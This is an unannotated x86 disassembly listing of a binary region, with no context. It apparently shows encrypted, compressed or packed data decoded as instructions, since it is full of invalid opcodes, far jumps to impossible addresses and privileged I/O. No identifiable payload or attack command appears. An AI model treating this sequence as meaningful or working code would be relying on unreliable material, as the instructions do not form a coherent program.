  41e3d7:	jp     0x41e417
  41e3d9:	mov    ds:0x6c816095,eax
  41e3de:	jge    0x41e40d
  41e3e0:	inc    edi
  41e3e1:	mov    bh,0xb1
  41e3e3:	int3   
  41e3e4:	in     al,0x7a
  41e3e6:	lods   al,BYTE PTR ds:[esi]
  41e3e7:	in     eax,dx
  41e3e8:	fsub   st(2),st
  41e3ea:	imul   ebp,DWORD PTR [esi+eax*1],0xd1e2549a
  41e3f1:	push   ebp
  41e3f2:	pusha  
  41e3f3:	pop    esi
  41e3f4:	xor    DWORD PTR [edx+esi*2],ebp
  41e3f7:	cmp    eax,0x715acf54
  41e3fc:	jecxz  0x41e3a5
  41e3fe:	test   DWORD PTR [eax+ebx*2],ebp
  41e401:	cmp    al,0x79
  41e403:	imul   ebp,DWORD PTR [esi-0x39],0x6e4f481e
  41e40a:	add    bl,dl
  41e40c:	stos   BYTE PTR es:[edi],al
  41e40d:	add    BYTE PTR [ebx-0x90c0aca],dl
  41e413:	imul   ebx,DWORD PTR [edi-0x5847ed53],0x10
  41e41a:	push   esi
  41e41b:	cmp    ebp,DWORD PTR [eax]
  41e41d:	inc    edx
  41e41e:	sbb    BYTE PTR [edx+0x64a18857],cl
  41e424:	ret    
  41e425:	fisub  DWORD PTR [edi]
  41e427:	(bad)  
  41e428:	mov    cl,0x40
  41e42a:	fisubr DWORD PTR [edi+0x52]
  41e42d:	xlat   BYTE PTR ds:[ebx]
  41e42e:	out    dx,al
  41e42f:	ds retf 0x2a07
  41e433:	ret    0xf6be
  41e436:	mov    es,WORD PTR [edx+0x23]
  41e439:	rdpmc  
  41e43b:	cmp    BYTE PTR [edi],bl
  41e43d:	stos   BYTE PTR es:[edi],al
  41e43e:	int    0xb0
  41e440:	into   
  41e441:	jne    0x41e4a4
  41e443:	push   ebp
  41e444:	and    al,0xb6
  41e446:	sub    al,0x94
  41e448:	jno    0x41e457
  41e44a:	retf   
  41e44b:	sub    esp,DWORD PTR [edx-0x6b44ef08]
  41e451:	imul   esp,DWORD PTR [ecx],0x7d761cf9
  41e457:	mov    al,0xb6
  41e459:	mov    esi,0x491056d1
  41e45e:	push   es
  41e45f:	sti    
  41e460:	jmp    0xb0c3:0x839c7a8e
  41e467:	pop    ds
  41e468:	(bad)  
  41e469:	jle    0x41e412
  41e46b:	jb     0x41e43e
  41e46d:	push   ebx
  41e46e:	dec    eax
  41e46f:	and    cl,ah
  41e471:	or     bh,BYTE PTR [edx-0x66]
  41e474:	mov    al,0xab
  41e476:	and    BYTE PTR [edx],dl
  41e478:	loop   0x41e4cb
  41e47a:	jmp    0x991f3d3c
  41e47f:	mov    ebx,0x3a8a029c
  41e484:	(bad)  
  41e485:	ficom  WORD PTR [eax-0x4e065a43]
  41e48b:	cmp    bl,bl
  41e48d:	push   eax
  41e48e:	dec    ebx
  41e48f:	mov    bh,0x7b
  41e491:	repz mov ah,0x7c
  41e494:	clc    
  41e495:	mov    bl,0x7e
  41e497:	call   0x99c7:0x8c0ebd4c
  41e49e:	xchg   edi,eax
  41e49f:	out    dx,al
  41e4a0:	pop    es
  41e4a1:	aaa    
  41e4a2:	cmp    esi,edi
  41e4a4:	dec    eax
  41e4a5:	out    0x4a,eax
  41e4a7:	xlat   BYTE PTR ds:[ebx]
  41e4a8:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41e4aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4ab:	sar    WORD PTR [edi+ebp*8],cl
  41e4af:	dec    edx
  41e4b0:	repnz fld TBYTE PTR [esi]
  41e4b3:	bnd jp 0x41e4b6
	...
  41e516:	and    BYTE PTR [edx-0x35],ch
  41e519:	dec    ebx
  41e51a:	retf   
  41e51b:	jmp    0x41e4bd
  41e51d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9a
  41e521:	push   ss
  41e522:	cmp    edx,DWORD PTR [edx]
  41e524:	dec    esp
  41e525:	(bad)  
  41e527:	inc    eax
  41e528:	add    DWORD PTR [eax],eax
  41e52a:	pop    es
  41e52b:	add    DWORD PTR [eax],eax
  41e52d:	add    BYTE PTR [esi+0x74],cl
  41e530:	lods   al,BYTE PTR ss:[esi]
  41e532:	xor    ebp,eax
  41e534:	xchg   BYTE PTR [ebx+0x4232d1aa],bh
  41e53a:	aam    0xac
  41e53c:	(bad)  
  41e53d:	repnz cmp edx,DWORD PTR [edi+0x9]
  41e541:	bound  eax,QWORD PTR [esi-0x51]
  41e544:	test   al,0xf5
  41e546:	aas    
  41e547:	stos   BYTE PTR es:[edi],al
  41e548:	(bad)  
  41e549:	mul    DWORD PTR [ebp-0x28b2ad1d]
  41e54f:	lahf   
  41e550:	mov    bh,0xfb
  41e552:	pop    ebx
  41e553:	mov    edx,0x2ccf2ee9
  41e558:	mov    dh,0x75
  41e55a:	add    ebx,ebp
  41e55c:	xchg   esp,eax
  41e55d:	gs pop es
  41e55f:	push   edi
  41e560:	shr    DWORD PTR [ecx+esi*2-0x3d363177],cl
  41e567:	fstp   st(7)
  41e569:	daa    
  41e56a:	pop    ecx
  41e56b:	mov    al,ds:0x93a23347
  41e570:	call   0x5f9e3f5f
  41e575:	dec    edx
  41e576:	xlat   BYTE PTR ds:[ebx]
  41e577:	out    dx,eax
  41e578:	mov    al,ds:0x7b1f6e94
  41e57d:	sub    dl,BYTE PTR [eax-0x6dd0d345]
  41e583:	inc    edx
  41e584:	imul   edi,DWORD PTR [ebx-0x36],0x44e01d2f
  41e58b:	ins    BYTE PTR es:[edi],dx
  41e58c:	or     eax,0x5bca7eae
  41e591:	(bad)  
  41e592:	push   ebp
  41e593:	mov    es,WORD PTR [esi]
  41e595:	loopne 0x41e5aa
  41e597:	pop    ss
  41e598:	mov    ds,WORD PTR [edx-0x3c]
  41e59b:	mov    ds:0x1dc5e111,al
  41e5a0:	enter  0x14d,0x91
  41e5a4:	push   edx
  41e5a5:	push   esi
  41e5a6:	push   eax
  41e5a7:	or     al,0xe4
  41e5a9:	cmp    cl,ch
  41e5ab:	ja     0x41e5ea
  41e5ad:	lods   eax,DWORD PTR ds:[esi]
  41e5ae:	sbb    esi,DWORD PTR ds:0x78b8f604
  41e5b4:	sub    BYTE PTR [esi+0x4a],bl
  41e5b7:	mov    esp,0x79471edc
  41e5bc:	test   al,0x88
  41e5be:	call   0x5449:0x105788c6
  41e5c5:	adc    DWORD PTR [ebp+0x5dce5a62],ebx
  41e5cb:	sbb    edx,DWORD PTR [ebx]
  41e5cd:	(bad)  
  41e5cf:	ins    DWORD PTR es:[edi],dx
  41e5d0:	outs   dx,DWORD PTR ds:[esi]
  41e5d1:	xchg   edx,eax
  41e5d2:	xor    eax,0xd95379b7
  41e5d7:	nop
  41e5d8:	stos   BYTE PTR es:[edi],al
  41e5d9:	cld    
  41e5da:	pop    edx
  41e5db:	cmc    
  41e5dc:	and    eax,0xe5d85ba
  41e5e1:	push   eax
  41e5e2:	test   sp,sp
  41e5e5:	add    BYTE PTR [esi-0x5f],bl
  41e5e8:	aam    0x46
  41e5ea:	add    al,0xf0
  41e5ec:	add    esp,edi
  41e5ee:	mov    ah,0xba
  41e5f0:	nop
  41e5f1:	inc    ebx
  41e5f2:	add    BYTE PTR [esi],dl
  41e5f4:	retf   
  41e5f5:	jo     0x41e5bc
  41e5f7:	pop    es
  41e5f8:	loope  0x41e63a
  41e5fa:	ret    0x2edb
  41e5fd:	inc    edx
  41e5fe:	xor    bl,dh
  41e600:	mov    edi,0x6058ba1
  41e605:	sub    eax,0x5a8768d2
  41e60a:	idiv   DWORD PTR ds:[esi+0x6d]
  41e60e:	xor    DWORD PTR [ecx+0x11],ebp
  41e611:	inc    ecx
  41e612:	std    
  41e613:	pop    ds
  41e614:	mov    esi,0x98450358
  41e619:	add    esi,DWORD PTR [esi-0x352d3000]
  41e61f:	popf   
  41e620:	jmp    0x32a31c45
  41e625:	jae    0xda67dfaf
  41e62b:	data16 xchg cl,cl
  41e62e:	mov    bl,0xaf
  41e630:	jmp    0x0:0xeedf9953
	...
  41e693:	add    BYTE PTR [eax],al
  41e695:	add    ch,al
  41e697:	cwde   
  41e698:	loope  0x41e6ef
  41e69a:	std    
  41e69b:	jge    0x41e692
  41e69d:	cwde   
  41e69e:	xchg   edx,eax
  41e69f:	fmul   st(5),st
  41e6a1:	mov    ds:0xfc8e7357,al
  41e6a6:	std    
  41e6a7:	inc    ecx
  41e6a8:	add    DWORD PTR [eax],eax
  41e6aa:	pop    es
  41e6ab:	add    DWORD PTR [eax],eax
  41e6ad:	add    ch,cl
  41e6af:	stos   DWORD PTR es:[edi],eax
  41e6b0:	push   ebp
  41e6b1:	sti    
  41e6b2:	lods   al,BYTE PTR cs:[esi]
  41e6b4:	(bad)  
  41e6b5:	fimul  WORD PTR [edi]
  41e6b7:	gs xchg ebp,eax
  41e6b9:	mov    eax,0x72da9794
  41e6be:	adc    DWORD PTR [edx+0x45],ebx
  41e6c1:	or     bl,cl
  41e6c3:	sti    
  41e6c4:	and    al,0x39
  41e6c6:	sub    ecx,esp
  41e6c8:	and    bl,BYTE PTR [ebx+0x6a]
  41e6cb:	cld    
  41e6cc:	mov    ebp,DWORD PTR ss:[eax]
  41e6cf:	push   0x65
  41e6d1:	pop    esp
  41e6d3:	dec    esp
  41e6d4:	icebp  
  41e6d5:	sub    bl,dl
  41e6d7:	push   0x5a8d4fcd
  41e6dc:	mov    dh,0x2f
  41e6de:	ins    BYTE PTR es:[edi],dx
  41e6df:	fcmovnu st,st(0)
  41e6e1:	mov    ch,0x79
  41e6e3:	test   dl,bh
  41e6e5:	fbstp  TBYTE PTR [edi-0x79]
  41e6e8:	ret    0x1c31
  41e6eb:	mov    ah,BYTE PTR gs:[esi-0x226172b7]
  41e6f2:	(bad)  
  41e6f3:	push   ss
  41e6f4:	push   0x55
  41e6f6:	repnz (bad) 
  41e6f8:	lds    edi,FWORD PTR [edi+0x73baa6ec]
  41e6fe:	xlat   BYTE PTR ds:[ebx]
  41e6ff:	xchg   DWORD PTR [esi-0x6aeab83a],eax
  41e705:	int    0x5
  41e707:	shr    ecx,0x20
  41e70a:	das    
  41e70b:	scas   eax,DWORD PTR es:[edi]
  41e70c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e70d:	xchg   ebp,eax
  41e70e:	lds    ebp,FWORD PTR [edx-0x77]
  41e711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e712:	add    DWORD PTR [edx+0x7b],0x2127432e
  41e719:	push   es
  41e71a:	pop    edi
  41e71b:	jg     0x41e72c
  41e71d:	adc    ecx,ecx
  41e71f:	fwait
  41e720:	scas   al,BYTE PTR es:[edi]
  41e721:	outs   dx,DWORD PTR ds:[esi]
  41e722:	daa    
  41e723:	mov    ebx,0xeec46fb4
  41e728:	add    al,0x5a
  41e72a:	or     cl,BYTE PTR [ebx+0x49317154]
  41e730:	in     eax,0x46
  41e732:	sub    al,0x59
  41e734:	adc    ecx,DWORD PTR [esi+0x140b2bf]
  41e73a:	mov    ch,0x27
  41e73c:	imul   BYTE PTR [edx-0x80]
  41e73f:	xchg   ebp,eax
  41e740:	or     ch,al
  41e742:	pop    ss
  41e743:	or     al,dl
  41e745:	(bad)  
  41e746:	popa   
  41e747:	dec    ecx
  41e748:	dec    edx
  41e749:	int    0xe6
  41e74b:	repz sub DWORD PTR [eax-0x232d53c5],esi
  41e752:	inc    eax
  41e753:	mov    al,0x84
  41e755:	pop    edi
  41e756:	lea    eax,[ebp-0x2a]
  41e759:	xor    esp,ecx
  41e75b:	push   edi
  41e75c:	nop
  41e75d:	test   bh,bl
  41e75f:	mov    dl,0x11
  41e761:	dec    edi
  41e762:	repz sbb edx,0x5b
  41e766:	dec    edi
  41e767:	sbb    ebx,DWORD PTR [esi]
  41e769:	inc    ecx
  41e76a:	jp     0x41e772
  41e76c:	pop    edi
  41e76d:	enter  0x1888,0x7b
  41e771:	ins    DWORD PTR es:[edi],dx
  41e772:	lahf   
  41e773:	stos   DWORD PTR es:[edi],eax
  41e774:	dec    edx
  41e775:	lahf   
  41e776:	in     eax,dx
  41e777:	sub    DWORD PTR [edi+esi*4+0x32],0xffffff87
  41e77c:	lods   eax,DWORD PTR ds:[esi]
  41e77d:	adc    BYTE PTR [ebp+edx*1-0x7a],bh
  41e781:	cli    
  41e782:	xor    eax,0xf1f31b53
  41e787:	into   
  41e788:	jle    0x41e74d
  41e78a:	ins    BYTE PTR es:[edi],dx
  41e78b:	jecxz  0x41e74d
  41e78d:	or     edi,ebp
  41e78f:	(bad)  
  41e790:	push   edi
  41e791:	or     al,0xa5
  41e793:	mov    al,0xc6
  41e795:	add    DWORD PTR [edi-0x4f93a238],edi
  41e79b:	and    esp,DWORD PTR [ebx-0x65890d41]
  41e7a1:	loopne 0x41e7e0
  41e7a3:	add    al,0x2c
  41e7a5:	jmp    0x72b4:0x1ee47f9c
  41e7ac:	sahf   
  41e7ad:	(bad)  
  41e7ae:	push   edx
  41e7af:	fmulp  st(5),st
  41e7b1:	sahf   
  41e7b2:	shl    dl,cl
  41e7b4:	imul   eax,DWORD PTR [eax],0x0
	...
  41e816:	sub    eax,0x9e5c8a39
  41e81b:	(bad)  
  41e81c:	(bad)  
  41e81d:	jns    0x41e875
  41e81f:	imul   ebx,DWORD PTR [esi+eiz*2],0xfffffff0
  41e823:	inc    ecx
  41e824:	es or  eax,0x14304
  41e82a:	pop    es
  41e82b:	add    DWORD PTR [eax],eax
  41e82d:	add    BYTE PTR [edi],cl
  41e82f:	outs   dx,BYTE PTR ds:[esi]
  41e830:	jg     0x41e89b
  41e832:	daa    
  41e833:	aad    0x7a
  41e835:	into   
  41e836:	gs clc 
  41e838:	or     BYTE PTR [eax+edi*2],0x1f
  41e83c:	mov    DWORD PTR [esi+esi*4],eax
  41e83f:	mov    edx,edi
  41e841:	push   ecx
  41e842:	jle    0x3b242b8b
  41e848:	ins    BYTE PTR es:[edi],dx
  41e849:	rcl    DWORD PTR [ebx],0xa6
  41e84c:	shl    DWORD PTR [eax+0x62],0x9a
  41e850:	push   ds
  41e851:	sub    ebx,ecx
  41e853:	inc    ecx
  41e854:	div    bl
  41e856:	jns    0x41e8ba
  41e858:	cwde   
  41e859:	cmp    BYTE PTR [ebx],0x42
  41e85c:	mov    ch,0x8d
  41e85e:	cmc    
  41e85f:	sub    al,0x47
  41e861:	loopne 0x41e801
  41e863:	out    0xbf,al
  41e865:	ja     0x41e89d
  41e867:	data16 aas 
  41e869:	sbb    eax,0xe978edb4
  41e86e:	outs   dx,DWORD PTR ds:[esi]
  41e86f:	sbb    DWORD PTR [edx],edx
  41e871:	aaa    
  41e872:	retf   0x8fad
  41e875:	xor    bl,BYTE PTR [edi-0x25]
  41e878:	sub    BYTE PTR [ebp*4+0x46844744],ah
  41e87f:	push   ebx
  41e880:	xor    DWORD PTR [edx],ebp
  41e882:	aas    
  41e883:	ins    DWORD PTR es:[edi],dx
  41e884:	les    edi,FWORD PTR [edi+0x3052e919]
  41e88a:	mov    dh,0x4
  41e88c:	pusha  
  41e88d:	dec    ebx
  41e88e:	bound  ebx,QWORD PTR [eax]
  41e890:	repz scas eax,DWORD PTR es:[edi]
  41e892:	fcom   DWORD PTR [edx]
  41e894:	xor    bl,BYTE PTR [esi]
  41e896:	mov    edi,0x55952ec8
  41e89b:	pop    ebx
  41e89c:	jl     0x41e8e1
  41e89e:	imul   ebp,edx,0x58612a71
  41e8a4:	mov    ch,0x48
  41e8a6:	xor    al,0xee
  41e8a8:	jo     0x41e8b5
  41e8aa:	arpl   WORD PTR [ecx-0x671bc9d2],ax
  41e8b0:	out    0xbd,eax
  41e8b2:	inc    edx
  41e8b3:	sar    eax,1
  41e8b5:	cdq    
  41e8b6:	mov    dh,0xb9
  41e8b8:	push   cs
  41e8b9:	sbb    DWORD PTR [edi-0x46],ebx
  41e8bc:	cmp    eax,0x9bd22ecd
  41e8c1:	mov    edx,ecx
  41e8c3:	xchg   esp,eax
  41e8c4:	out    dx,al
  41e8c5:	ret    0x71f8
  41e8c8:	fwait
  41e8c9:	dec    ecx
  41e8ca:	cmp    ebp,esi
  41e8cc:	adc    edx,DWORD PTR ds:0x7ec245c0
  41e8d2:	adc    eax,DWORD PTR [ebx+eiz*8]
  41e8d5:	and    esp,edx
  41e8d7:	dec    edx
  41e8d8:	fldenv [edx]
  41e8da:	cld    
  41e8db:	sbb    dl,BYTE PTR ds:0x931007af
  41e8e1:	ret    0x1070
  41e8e4:	rcr    DWORD PTR [edx+0x5472a73c],0xc2
  41e8eb:	hlt    
  41e8ec:	jmp    0x4653ffbf
  41e8f1:	and    eax,0x4b01e89b
  41e8f6:	sbb    ebx,DWORD PTR [edx-0x18710ec1]
  41e8fc:	out    dx,al
  41e8fd:	pop    edx
  41e8fe:	or     BYTE PTR [edi+0x6],0xf4
  41e902:	aam    0xb3
  41e904:	clc    
  41e905:	(bad)  
  41e906:	xor    ch,bh
  41e908:	nop
  41e909:	pop    esp
  41e90a:	sub    bh,ch
  41e90c:	adc    eax,0xc5feaef4
  41e911:	dec    eax
  41e912:	sti    
  41e913:	inc    esp
  41e914:	call   0x86a9:0x9646786b
  41e91b:	call   0x49fc:0x30b57a3a
  41e922:	cmp    eax,DWORD PTR [eax+0x56d546f4]
  41e928:	hlt    
  41e929:	jne    0x41e9a4
  41e92b:	arpl   WORD PTR [ebx+0x6e],di
  41e92e:	pop    edi
  41e92f:	fstp   QWORD PTR [eax-0xf9ec69b]
	...
  41e995:	add    BYTE PTR [eax-0x3],bh
  41e998:	ret    0xc766
  41e99b:	jg     0x41e999
  41e99d:	(bad)  
  41e99e:	jmp    0x41e94c
  41e9a0:	repnz xchg ecx,eax
  41e9a2:	jns    0x41e9f2
  41e9a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9a5:	mov    esp,0x1440b
  41e9aa:	pop    es
  41e9ab:	add    DWORD PTR [eax],eax
  41e9ad:	add    BYTE PTR [esi+0x3b],bl
  41e9b0:	push   ecx
  41e9b1:	inc    DWORD PTR [eax-0x3b40c3a6]
  41e9b7:	push   0xd13ad4d
  41e9bc:	adc    eax,0x53c2bc25
  41e9c1:	imul   ebp,DWORD PTR [ebp+0x3c],0xffffff9b
  41e9c5:	popa   
  41e9c6:	out    dx,al
  41e9c7:	push   0x1d25b6b3
  41e9cc:	cs xchg ebp,eax
  41e9ce:	outs   dx,BYTE PTR ds:[esi]
  41e9cf:	aad    0x75
  41e9d1:	or     bh,al
  41e9d3:	(bad)  [ebx+0x36ee4ec8]
  41e9d9:	xor    ebx,DWORD PTR [ebp-0x7351a1f7]
  41e9df:	jb     0x41ea4b
  41e9e1:	pusha  
  41e9e2:	or     DWORD PTR [eax],edx
  41e9e4:	(bad)  
  41e9e5:	jmp    DWORD PTR [ecx+eax*8-0x21d33013]
  41e9ec:	hlt    
  41e9ed:	out    0x32,eax
  41e9ef:	lea    edi,[ebx+eax*2-0x2c95de39]
  41e9f6:	sub    al,0xd9
  41e9f8:	and    eax,0x7ba5bdfb
  41e9fd:	inc    eax
  41e9fe:	mov    BYTE PTR [esi+0x6a5731b6],dl
  41ea04:	fcmovnu st,st(3)
  41ea06:	sbb    DWORD PTR [esp+edi*2+0x6b],edi
  41ea0a:	pushf  
  41ea0b:	xchg   esi,eax
  41ea0c:	je     0x41ea3a
  41ea0e:	cld    
  41ea0f:	popf   
  41ea10:	adc    edi,DWORD PTR [ebx-0x10ba2e03]
  41ea16:	sbb    dl,BYTE PTR [ebx]
  41ea18:	popf   
  41ea19:	les    eax,FWORD PTR [ecx-0x4d]
  41ea1c:	and    al,0x61
  41ea1e:	into   
  41ea1f:	push   ebp
  41ea20:	clc    
  41ea21:	mov    eax,0xc35835f8
  41ea26:	mov    al,ds:0xaa6e3c70
  41ea2b:	pop    ecx
  41ea2c:	jl     0x41ea48
  41ea2e:	jecxz  0x41e9b3
  41ea30:	inc    ecx
  41ea31:	or     bl,BYTE PTR [eax+0x5ecdd6c5]
  41ea37:	scas   eax,DWORD PTR es:[edi]
  41ea38:	push   ebp
  41ea39:	cs dec ebx
  41ea3b:	repnz cld 
  41ea3d:	add    BYTE PTR [edi],ch
  41ea3f:	aaa    
  41ea40:	pop    ss
  41ea41:	leave  
  41ea42:	iret   
  41ea43:	addr16 push ebx
  41ea45:	cmp    eax,0xa4bfbb2d
  41ea4a:	(bad)  
  41ea4b:	lods   al,BYTE PTR ds:[esi]
  41ea4c:	aas    
  41ea4d:	dec    esi
  41ea4e:	jg     0x41ea05
  41ea50:	sbb    esp,DWORD PTR [eax]
  41ea52:	loop   0x41ea72
  41ea54:	outs   dx,BYTE PTR ds:[esi]
  41ea55:	xchg   edi,eax
  41ea56:	ins    BYTE PTR es:[edi],dx
  41ea57:	xor    DWORD PTR [edx+ecx*4],edi
  41ea5a:	lods   eax,DWORD PTR ds:[esi]
  41ea5b:	loope  0x41e9e0
  41ea5d:	sbb    al,0x93
  41ea5f:	jo     0x41ea0d
  41ea61:	aad    0x6c
  41ea63:	mov    dh,0x59
  41ea65:	pop    ebx
  41ea66:	jnp    0x41eaa5
  41ea68:	pop    edi
  41ea69:	cli    
  41ea6a:	xchg   ecx,eax
  41ea6b:	nop
  41ea6c:	sbb    al,0x81
  41ea6e:	jb     0x41eac0
  41ea70:	inc    ebp
  41ea71:	gs jp  0x41eade
  41ea74:	mov    esp,0x1e8b19d1
  41ea79:	es retf 
  41ea7b:	aas    
  41ea7c:	jp     0x41ea83
  41ea7e:	cmp    al,bl
  41ea80:	xchg   ch,ch
  41ea82:	mov    DWORD PTR [ebp-0x4be9d962],ebx
  41ea88:	inc    edi
  41ea89:	adc    esi,DWORD PTR [edi+0x2f]
  41ea8c:	cmc    
  41ea8d:	(bad)  
  41ea8e:	out    dx,eax
  41ea8f:	inc    ebx
  41ea90:	inc    ebp
  41ea91:	xchg   ebp,ebp
  41ea93:	outs   dx,DWORD PTR ds:[esi]
  41ea94:	cdq    
  41ea95:	cwde   
  41ea96:	shl    DWORD PTR [edx+0x68],0xc0
  41ea9a:	test   al,0xd3
  41ea9c:	shl    bl,cl
  41ea9e:	cli    
  41ea9f:	jne    0x41ea21
  41eaa1:	stc    
  41eaa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaa3:	in     al,dx
  41eaa4:	dec    ebx
  41eaa5:	loope  0x41eb19
  41eaa7:	test   DWORD PTR [edx],ebx
  41eaa9:	arpl   WORD PTR [edi],dx
  41eaab:	ret    
  41eaac:	lods   eax,DWORD PTR ds:[esi]
  41eaad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaae:	(bad)  
  41eaaf:	push   ecx
  41eab0:	loope  0x41eb19
  41eab2:	cli    
  41eab3:	mov    ecx,0x1a
	...
  41eb14:	add    BYTE PTR [eax],al
  41eb16:	adc    ch,BYTE PTR [edi]
  41eb18:	mov    esi,DWORD PTR [edi+edi*4+0x22af3fb4]
  41eb1f:	and    ebp,DWORD PTR [eax]
  41eb21:	fstp   DWORD PTR [ecx+ebp*8+0x44]
  41eb25:	adc    DWORD PTR [edx],0x7000145
  41eb2b:	add    DWORD PTR [eax],eax
  41eb2d:	add    BYTE PTR [ebx+0x2b],al
  41eb30:	sahf   
  41eb31:	ret    0x48de
  41eb34:	movaps xmm6,xmm7
  41eb37:	jmp    0x2f2f9b78
  41eb3c:	data16 aaa 
  41eb3e:	sub    edx,DWORD PTR ds:0xee203e15
  41eb44:	ret    
  41eb45:	les    ecx,FWORD PTR [ebx-0x77]
  41eb48:	in     al,dx
  41eb49:	in     al,dx
  41eb4a:	mov    esp,0x599d3a80
  41eb4f:	push   esp
  41eb50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb51:	or     al,0x58
  41eb53:	add    eax,0xe897bb0
  41eb58:	push   esp
  41eb59:	mov    ah,0xb1
  41eb5b:	add    eax,DWORD PTR [esp+edx*4]
  41eb5e:	jle    0x41eb15
  41eb60:	push   esi
  41eb61:	sbb    DWORD PTR [ecx],0xde1e9250
  41eb67:	lods   eax,DWORD PTR ds:[esi]
  41eb68:	std    
  41eb69:	xor    DWORD PTR [edi-0x4c],edx
  41eb6c:	add    cl,BYTE PTR [ebx+0x52]
  41eb6f:	xlat   BYTE PTR ds:[ebx]
  41eb70:	jle    0x41eba3
  41eb72:	loope  0x41ebe1
  41eb74:	sbb    edi,ebp
  41eb76:	int3   
  41eb77:	icebp  
  41eb78:	pushf  
  41eb79:	mov    ds:0xddbe8823,eax
  41eb7e:	mov    ebx,eax
  41eb80:	mov    ch,BYTE PTR cs:[ecx-0xc8d7a1b]
  41eb87:	and    al,0x81
  41eb89:	(bad)  
  41eb8b:	xor    al,BYTE PTR gs:[ebp+0x12b7c49a]
  41eb92:	jge    0x41eb62
  41eb94:	je     0x41eb44
  41eb96:	cli    
  41eb97:	cmp    dl,BYTE PTR [ebp+0x45]
  41eb9a:	lods   al,BYTE PTR ds:[esi]
  41eb9b:	mov    al,ds:0xf887d3f
  41eba0:	mov    DWORD PTR [edi+0x62],eax
  41eba3:	fadd   QWORD PTR [eax-0x16c8f890]
  41eba9:	and    BYTE PTR [ecx-0x36c25191],al
  41ebaf:	std    
  41ebb0:	jle    0x41ec05
  41ebb2:	cmp    al,0x55
  41ebb4:	sub    eax,0x829ba88b
  41ebb9:	pop    esp
  41ebba:	add    eax,0x45310da2
  41ebbf:	jo     0x41ebd0
  41ebc1:	aad    0x4d
  41ebc3:	xchg   ebp,eax
  41ebc4:	xor    eax,0x6cc371d1
  41ebc9:	retf   
  41ebca:	out    dx,al
  41ebcb:	test   eax,0xb6d1246b
  41ebd0:	jb     0x41eb7d
  41ebd2:	or     eax,DWORD PTR [ecx-0x2f]
  41ebd5:	mov    esi,0x321415a9
  41ebda:	jb     0x41ec51
  41ebdc:	sub    al,0xfd
  41ebde:	pop    esi
  41ebdf:	dec    ebx
  41ebe0:	cmp    DWORD PTR [eax-0x73],ebp
  41ebe3:	fstp   TBYTE PTR [edx-0x33]
  41ebe6:	dec    esp
  41ebe7:	and    DWORD PTR [edx],ecx
  41ebe9:	mov    esi,0xe89016b5
  41ebee:	or     al,0xe0
  41ebf0:	pushf  
  41ebf1:	scas   al,BYTE PTR es:[edi]
  41ebf2:	pop    ss
  41ebf3:	inc    eax
  41ebf4:	mov    ebx,0x549a05ab
  41ebf9:	lds    esp,FWORD PTR [edx+0x3c02ba20]
  41ebff:	(bad)  
  41ec00:	frstor [ecx+ebp*8-0x5a937958]
  41ec07:	shl    esi,1
  41ec09:	ins    DWORD PTR es:[edi],dx
  41ec0a:	daa    
  41ec0b:	mov    eax,0xe58d2080
  41ec10:	jmp    0x49b42c35
  41ec15:	es jbe 0x41ebd4
  41ec18:	test   eax,0xb0d3e532
  41ec1d:	add    dl,BYTE PTR [ebp+0x61]
  41ec20:	ret    0xd214
  41ec23:	ror    ebx,0xa
  41ec26:	xchg   esp,eax
  41ec27:	push   edx
  41ec28:	scas   eax,DWORD PTR es:[edi]
  41ec29:	es mov dl,dh
  41ec2c:	jbe    0x41ec8f
  41ec2e:	inc    ecx
  41ec2f:	sub    bl,BYTE PTR [ebx-0x523e0b79]
	...
  41ec95:	add    BYTE PTR [ecx-0xf],al
  41ec98:	(bad)
  41ec9b:	hlt    
  41ec9c:	gs icebp 
  41ec9e:	adc    ebx,edi
  41eca0:	ficom  WORD PTR [ecx]
  41eca2:	mov    ds:0x199a2ee6,al
  41eca7:	inc    esi
  41eca8:	add    DWORD PTR [eax],eax
  41ecaa:	pop    es
  41ecab:	add    DWORD PTR [eax],eax
  41ecad:	add    BYTE PTR [eax-0x4c],ch
  41ecb0:	inc    esi
  41ecb1:	mov    al,0x8d
  41ecb3:	mov    eax,0xa5b4f29
  41ecb8:	jne    0x41ec4a
  41ecba:	jmp    0xa054fe21
  41ecbf:	scas   al,BYTE PTR es:[edi]
  41ecc0:	mov    ds:0xa4c40b8f,al
  41ecc5:	arpl   WORD PTR [esi+0x48],bx
  41ecc8:	mov    dh,0xb5
  41ecca:	test   DWORD PTR [ebp-0x19],edi
  41eccd:	loop   0x41ec94
  41eccf:	inc    ebp
  41ecd0:	call   DWORD PTR [esi+ebx*2+0x4c551567]
  41ecd7:	sbb    ah,ch
  41ecd9:	nop
  41ecda:	neg    BYTE PTR [edx+0x31]
  41ecdd:	jns    0x41ed56
  41ecdf:	sub    esp,eax
  41ece1:	inc    ebx
  41ece2:	inc    edx
  41ece3:	dec    ebp
  41ece4:	(bad)  
  41ece5:	adc    al,0x4d
  41ece7:	imul   edx,eax,0x27f0ff0d
  41eced:	push   ss
  41ecee:	jnp    0x41ecf8
  41ecf0:	outs   dx,DWORD PTR ds:[esi]
  41ecf1:	retf   
  41ecf2:	scas   eax,DWORD PTR es:[edi]
  41ecf3:	xor    DWORD PTR [ebp+0x2a],ebp
  41ecf6:	sub    BYTE PTR [ebx],0xfe
  41ecf9:	mov    edi,DWORD PTR [esi]
  41ecfb:	mov    edx,0xa1e4d771
  41ed00:	mov    dh,BYTE PTR [esi+esi*8]
  41ed03:	cdq    
  41ed04:	fimul  WORD PTR [edx+0x23]
  41ed07:	xchg   esp,eax
  41ed08:	sub    eax,0x9df56875
  41ed0d:	push   ebp
  41ed0e:	dec    eax
  41ed0f:	add    ebx,eax
  41ed11:	cld    
  41ed12:	cmp    cl,ah
  41ed14:	in     eax,0x67
  41ed16:	mul    BYTE PTR [ebx]
  41ed18:	push   ecx
  41ed19:	ins    DWORD PTR es:[edi],dx
  41ed1a:	or     eax,0x70cf4ed1
  41ed1f:	pop    eax
  41ed20:	add    dl,ah
  41ed22:	jne    0x41ed97
  41ed24:	mov    dl,0x97
  41ed26:	pop    eax
  41ed27:	bound  esp,QWORD PTR [ebx]
